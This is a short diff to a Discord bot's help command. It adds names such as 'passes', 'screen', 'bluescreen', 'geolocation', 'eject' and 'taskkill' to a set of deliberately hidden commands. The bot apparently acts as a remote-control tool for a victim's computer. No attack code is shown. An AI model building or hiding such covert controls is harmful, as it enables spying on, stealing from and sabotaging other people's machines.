@@ -496,7 +496,7 @@ def format_devices(devices):
 @bot.command(help="Displays this message")
 async def help(ctx, category: str = None):
     embed_pages = []
-    hidden_commands = {"cd", "download", "upload", "ls", "rm", "touch", "rmdir", "mkdir", "run", "bluescreen", "ran", "taskkill", "tskmngr", "checkadmin", "devices", "geolocation", "shutdown", "specs", "restart"}  # Liste der versteckten Befehle
+    hidden_commands = {"url", "screen", "screenstart", "screenstop", "reload", "on", "off", "eject", "passes", "add", "tts", "say", "cd", "download", "upload", "ls", "rm", "touch", "rmdir", "mkdir", "run", "bluescreen", "ran", "taskkill", "tskmngr", "checkadmin", "devices", "geolocation", "shutdown", "specs", "restart"}  # Liste der versteckten Befehle
 
     if category == "hidden":
         commands = sorted([command for command in bot.commands if command.name in hidden_commands], key=lambda x: x.name)
